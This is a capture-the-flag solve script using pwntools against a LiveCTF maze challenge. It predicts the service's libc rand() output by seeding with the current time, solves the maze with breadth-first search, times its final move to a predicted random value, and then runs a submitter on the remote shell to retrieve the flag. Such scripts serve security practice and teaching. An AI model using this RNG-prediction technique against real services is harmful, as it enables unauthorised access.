from pwn import *
import warnings
from ctypes import *
warnings.simplefilter("ignore")

cdll.LoadLibrary("libc.so.6")
libc = CDLL("libc.so.6")
#r = process("./challenge")
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
r = remote(HOST, int(PORT))
libc.srand(libc.time(0))
for i in range(591):
    libc.rand()

r.sendlineafter("torment:","a")
r.recvuntil("maze.")
maz = r.recvuntil("You are in room",drop=True)
maz = maz.decode("utf-8")
print(maz)
l = maz.split("\n")[1:-1]


def gp(i,j):
    return i*29+j
def va(p):
    return p>=0 and p<29*29

m = []
v = []
pa = {}
for ll in l:
    for i in ll[:-1]:
        c = 1
        if i == '#':
            c = 0
        elif i == '*':
            c = 2
        m.append(c)
        v.append(0)


import queue
q = queue.Queue()
q.put(gp(1,1))
s = 0
while not q.empty():
    p = q.get()
    if m[p] == 2:
        s = p
        print("Found")
        break
    v[p] = 1
    t = p + 1
    if va(t) and v[t]==0 and m[t]!=0:
        q.put(t)
        pa[t] = ['e',p]
    t = p - 1
    if va(t) and v[t]==0 and m[t]!=0:
        q.put(t)
        pa[t] = ['w',p]

    t = p + 29
    if va(t) and v[t]==0 and m[t]!=0:
        q.put(t)
        pa[t] = ['s',p]
    t = p - 29
    if va(t) and v[t]==0 and m[t]!=0:
        q.put(t)
        pa[t] = ['n',p]

sol = []
while True:
    if s not in pa.keys():
        break
    sol.append(pa[s][0])
    s = pa[s][1]

sol = sol[::-1]
for s in sol[:-1]:
    libc.rand()
    r.sendlineafter("torment:",s)

cnt = 0
while libc.rand()%1213 != 1212:
    cnt+=1
    r.sendlineafter("torment:",'x')

r.sendlineafter("torment:",sol[-1])
r.recvrepeat(1)
r.sendline(b'./submitter')
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
r.interactive()
